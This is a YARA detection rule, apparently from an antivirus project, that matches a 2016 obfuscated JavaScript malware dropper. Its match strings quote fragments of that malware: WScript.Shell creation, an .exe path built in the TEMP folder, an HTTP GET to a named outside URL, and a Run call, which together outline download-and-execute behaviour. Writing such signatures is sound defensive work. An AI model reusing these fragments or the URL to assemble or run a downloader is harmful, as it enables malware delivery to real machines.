rule sig_20160330_e567f482f35ff35abe36f52da35ac46f {
  meta:
    description = "datamaliciousorder - file 20160330_e567f482f35ff35abe36f52da35ac46f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d84ede0913652583c56affc2ef7f10d0327f25d3836b9c981c27531d626abe4d"

  strings:
    $s1  = "function _LX(_NQ, _C0){_W = _W * 1; return _NQ - _C0;};" fullword ascii
    $s2  = "var _WW = function _DG() {return WScript[_EJ](\"WScript\"+\".Shell\");}(), _QW = 11;" fullword ascii
    $s3  = "if (_ND[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "function _FJ() {return _WW[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"nO5FEUHLaIjwf74T.ex\" + \"e\";};" fullword ascii
    $s5  = "function _DU(){return _A + \"\";};" fullword ascii
    $s6  = "_ND[_P](\"GET\", \"http://topcarshop.ir/m1kas\", false);" fullword ascii
    $s7  = "function _C(_A0){_WW[\"Run\"](_A0, _W, _W);};" fullword ascii
    $s8  = "function _DA() {return ((_VC == true) && (_VC == _K)) ? 1 : _W;};" fullword ascii
    $s9  = "function _I()" fullword ascii
    $s10 = "function _D(){return _EJ;};" fullword ascii
    $s11 = "function _SV(){return 22;};" fullword ascii
    $s12 = " while (_MM){" fullword ascii
    $s13 = "function _NA(_P0) {var _YP = (1, 2, 3, 4, 5, _P0); return _YP;};" fullword ascii
    $s14 = "var _KC = new this[\"Date\"]();" fullword ascii
    $s15 = "return _LX(_T, _CN);" fullword ascii
    $s16 = "var _B = false;" fullword ascii
    $s17 = "var _K = false;" fullword ascii
    $s18 = "_K = true; " fullword ascii
    $s19 = "_VC = true; " fullword ascii
    $s20 = "var _VC = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}